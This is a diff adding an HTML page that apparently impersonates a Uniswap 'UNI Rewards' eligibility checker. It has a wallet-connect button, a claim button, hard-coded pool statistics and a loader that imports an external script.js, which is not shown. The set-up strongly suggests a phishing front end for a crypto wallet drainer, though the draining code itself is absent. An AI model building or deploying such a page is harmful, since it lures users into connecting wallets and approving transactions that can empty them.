@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UNI Rewards Checker</title>
+  <link rel="icon" type="image/webp" href="https://picui.ogmua.cn/s1/2026/03/15/69b653a2eddbd.webp">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <header class="header">
+    <div class="header-left">
+      <a href="/" class="logo-link">
+        <img src="https://picui.ogmua.cn/s1/2026/03/15/69b653a2eddbd.webp" alt="UNI Rewards" class="logo">
+        <span class="brand">UNI Rewards Checker</span>
+      </a>
+    </div>
+    <div class="header-right">
+      <div class="chain-dropdown">
+        <button id="chain-toggle" class="chain-toggle" aria-haspopup="listbox" aria-expanded="false">
+          <span id="chain-label">Base</span>
+          <svg class="chevron" width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M3 4.5L6 7.5L9 4.5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </button>
+        <ul id="chain-menu" class="chain-menu" role="listbox">
+          <li role="option" data-chain="8453">Base</li>
+          <li role="option" data-chain="1">Ethereum</li>
+        </ul>
+      </div>
+      <span id="addr" class="addr"></span>
+      <button id="connect-btn" class="connect-btn">Connect Wallet</button>
+    </div>
+  </header>
+
+  <main class="main">
+    <div class="content-card">
+      <h1 class="page-title">Check Eligibility for UNI Rewards</h1>
+      <p class="page-desc">Connect your wallet to verify eligibility and submit your reward claim.</p>
+
+      <div class="claim-card">
+        <button id="claim-btn" class="claim-btn">Get Started</button>
+        <p id="claim-status" class="claim-status" style="display:none;"></p>
+      </div>
+    </div>
+
+    <div class="content-card pool-card">
+      <h2 class="card-title">Claim Activity</h2>
+      <p id="pool-list-empty" class="empty-msg">Connect wallet to view claim details</p>
+      <div id="position-list" class="position-list"></div>
+    </div>
+
+    <div class="content-card lp-explore-card">
+      <h2 class="card-title">Explore Pools</h2>
+      <p class="card-desc">Supported liquidity pools on <span id="lp-chain-name">Base</span></p>
+      <div id="lp-pool-list" class="lp-pool-list"></div>
+    </div>
+
+    <div class="content-card pools-market-card">
+      <h2 class="card-title">Top Pools</h2>
+      <p class="card-desc">Reference market-style pool list (approx. 2-3 screens)</p>
+      <div class="pools-table">
+        <div class="pools-head">
+          <span>Pool</span>
+          <span>TVL</span>
+          <span>24H Volume</span>
+          <span>Fee Tier</span>
+        </div>
+
+        <div class="pools-row"><span>WETH / USDC</span><span>$182.4M</span><span>$95.1M</span><span>0.05%</span></div>
+        <div class="pools-row"><span>cbBTC / WETH</span><span>$88.9M</span><span>$36.8M</span><span>0.30%</span></div>
+        <div class="pools-row"><span>USDC / USDT</span><span>$77.2M</span><span>$51.9M</span><span>0.01%</span></div>
+        <div class="pools-row"><span>cbETH / WETH</span><span>$69.7M</span><span>$19.5M</span><span>0.05%</span></div>
+        <div class="pools-row"><span>WETH / BRETT</span><span>$44.3M</span><span>$21.2M</span><span>1.00%</span></div>
+        <div class="pools-row"><span>EURC / USDC</span><span>$40.1M</span><span>$7.4M</span><span>0.01%</span></div>
+        <div class="pools-row"><span>wstETH / WETH</span><span>$37.8M</span><span>$5.9M</span><span>0.05%</span></div>
+        <div class="pools-row"><span>USDbC / WETH</span><span>$32.6M</span><span>$16.7M</span><span>0.05%</span></div>
+        <div class="pools-row"><span>WETH / DAI</span><span>$29.3M</span><span>$12.8M</span><span>0.05%</span></div>
+        <div class="pools-row"><span>WETH / AERO</span><span>$25.4M</span><span>$10.3M</span><span>0.30%</span></div>
+        <div class="pools-row"><span>USDC / crvUSD</span><span>$22.1M</span><span>$4.1M</span><span>0.01%</span></div>
+        <div class="pools-row"><span>WETH / USDbC</span><span>$20.7M</span><span>$8.2M</span><span>0.05%</span></div>
+        <div class="pools-row"><span>cbBTC / USDC</span><span>$19.2M</span><span>$6.6M</span><span>0.30%</span></div>
+        <div class="pools-row"><span>USDC / EURC</span><span>$17.8M</span><span>$3.6M</span><span>0.01%</span></div>
+        <div class="pools-row"><span>WETH / OP</span><span>$16.4M</span><span>$7.2M</span><span>0.30%</span></div>
+        <div class="pools-row"><span>WETH / UNI</span><span>$15.9M</span><span>$6.9M</span><span>0.30%</span></div>
+        <div class="pools-row"><span>WETH / LINK</span><span>$14.6M</span><span>$5.8M</span><span>0.30%</span></div>
+        <div class="pools-row"><span>WETH / ARB</span><span>$13.7M</span><span>$4.4M</span><span>0.30%</span></div>
+        <div class="pools-row"><span>USDT / USDC</span><span>$12.9M</span><span>$9.1M</span><span>0.01%</span></div>
+        <div class="pools-row"><span>WETH / cbETH</span><span>$11.2M</span><span>$3.8M</span><span>0.05%</span></div>
+        <div class="pools-row"><span>WETH / rETH</span><span>$10.6M</span><span>$2.7M</span><span>0.05%</span></div>
+        <div class="pools-row"><span>USDC / USDbC</span><span>$9.8M</span><span>$6.1M</span><span>0.01%</span></div>
+        <div class="pools-row"><span>WETH / PEPE</span><span>$8.5M</span><span>$5.5M</span><span>1.00%</span></div>
+        <div class="pools-row"><span>WETH / DEGEN</span><span>$7.9M</span><span>$4.8M</span><span>1.00%</span></div>
+        <div class="pools-row"><span>cbBTC / USDT</span><span>$6.4M</span><span>$2.1M</span><span>0.30%</span></div>
+        <div class="pools-row"><span>WETH / ETHFI</span><span>$5.7M</span><span>$1.7M</span><span>0.30%</span></div>
+        <div class="pools-row"><span>USDC / GHO</span><span>$4.9M</span><span>$1.9M</span><span>0.01%</span></div>
+      </div>
+    </div>
+  </main>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
+  <script type="module">
+    const base = new URL('.', import.meta.url).href;
+    const candidates = ['/script.js', '/dist/script.js', new URL('script.js', base).href];
+    let loaded = false;
+    for (const src of candidates) {
+      try {
+        await import(/* @vite-ignore */ src);
+        loaded = true;
+        break;
+      } catch (e) {
+        console.warn('[BOOT] module load failed:', src, e);
+      }
+    }
+    if (!loaded) {
+      const status = document.getElementById('claim-status');
+      if (status) {
+        status.style.display = 'block';
+        status.classList.add('error');
+        status.textContent = 'Failed to load app scripts. Please refresh or redeploy static files.';
+      }
+    }
+  </script>
+</body>
+</html>
